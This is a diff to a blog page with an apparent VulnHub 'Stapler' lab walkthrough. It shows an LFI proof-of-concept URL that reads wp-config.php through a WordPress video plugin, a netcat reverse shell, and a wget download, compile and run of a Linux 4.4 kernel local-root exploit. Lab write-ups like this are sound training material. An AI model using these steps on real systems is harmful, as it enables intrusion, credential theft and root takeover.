@@ -12,7 +12,8 @@
 <meta name="description" content="Tools: netdiscover
 Nmap
 Wfuzz
-Nikto Vulnerability: Use netdiscover to detect target IP address netdiscover -i eth0 -r 192.168.41.0/24 192.168.41.152 &hellip;"> <meta name="keywords" content="">
+Nikto Vulnerability: WordPress Advanced Video Plugin 1.0 - Local File Inclusion
+Linux Kernel 4.4.x (Ubuntu 16.04) - & &hellip;"> <meta name="keywords" content="">
 
 	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
@@ -112,6 +113,9 @@ $(document).ready(
 
 
 <h3>Vulnerability:</h3>
+
+<p><a href="https://www.exploit-db.com/exploits/39646/">WordPress Advanced Video Plugin 1.0 - Local File Inclusion</a>
+<a href="https://www.exploit-db.com/exploits/39772/">Linux Kernel 4.4.x (Ubuntu 16.04) - &lsquo;double-fdput()&rsquo; in bpf(BPF_PROG_LOAD) Local Root Exploit</a></p>
 
 <!--more-->
 
@@ -580,7 +584,79 @@ $(document).ready(
 
 <p><img src="/images/blog/vulhub/stapler/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
 
-<p>and it is admin</p>
+<p>and it is admin.</p>
+
+<p>try to upload webshell and failed, since wordpress requires ftp cred.</p>
+
+<p>Checked other plugin, I found:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>searchsploit advanced video</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got a LFI exploit.</p>
+
+<p>Try the POC:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>https://192.168.41.152:12380/blogblog/wp-admin/admin-ajax.php?action=ave_publishPost&title=random&short=1&term=1&thumb=../wp-config.php</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and got:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check folder:</p>
+
+<p><code>https://192.168.41.152:12380/blogblog/wp-content/uploads/</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like the reverse shell is uploaded successfully, even it is not installed as plugin.</p>
+
+<p>setup netcat, get the shell:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>uname -a</code></p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get linux kernel version, then do</p>
+
+<p><code>searchsploit 4.4 | grep linux</code></p>
+
+<p>and found exploit <code>Linux Kernel 4.4.x (Ubuntu 16.04) - double-fdput() in bpf(BPF_PROG_LOAD) Local Root Exploit</code></p>
+
+<p>In kali:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wget https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/39772.zip
+</span><span class='line'>cp 39772.zip /var/www/html/</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In target:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>unzip 39772.zip
+</span><span class='line'>cd 39772
+</span><span class='line'>tar xvf exploit.tar
+</span><span class='line'>cd ebpf_mapfd_doubleput_exploit/
+</span><span class='line'>./compile.sh
+</span><span class='line'>./doubleput</span></code></pre></td></tr></table></div></figure>
+
+
+<p>get the root:</p>
+
+<p><img src="/images/blog/vulhub/stapler/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
 </div>
 
 
